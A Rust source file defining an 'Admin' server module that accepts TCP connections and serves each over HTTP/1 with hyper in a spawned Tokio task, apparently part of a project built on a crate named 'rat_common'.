mod service;

use std::io;
use std::net::SocketAddr;
use std::sync::{Arc, Weak};

use async_trait::async_trait;
use hyper::server::conn::http1;
use hyper_util::rt::TokioIo;
use log::error;
use rat_common::module::{Module, ModuleState};
use tokio::net::{TcpListener, TcpStream};

use crate::modules::server::Server;

pub struct Admin {
    _listener: TcpListener,
    _service: Arc<service::AdminService>,
    _state: Arc<ModuleState>,
}

impl Admin {
    pub fn new(server: Weak<Server>, listener: TcpListener) -> Self {
        let service = Arc::new(service::AdminService::new(server));

        Self {
            _listener: listener,
            _service: service,
            _state: Arc::new(ModuleState::new()),
        }
    }
}

#[async_trait]
impl Module for Admin {
    type EventType = io::Result<(TcpStream, SocketAddr)>;

    fn name(&self) -> &str {
        "Admin"
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        self._listener.accept().await
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        let (stream, addr) = event?;
        let io = TokioIo::new(stream);

        let service = self._service.clone();
        tokio::spawn(async move {
            if let Err(e) = http1::Builder::new().serve_connection(io, service).await {
                error!("Error serving admin connection from {addr}: {e}");
            }
        });

        Ok(())
    }
}
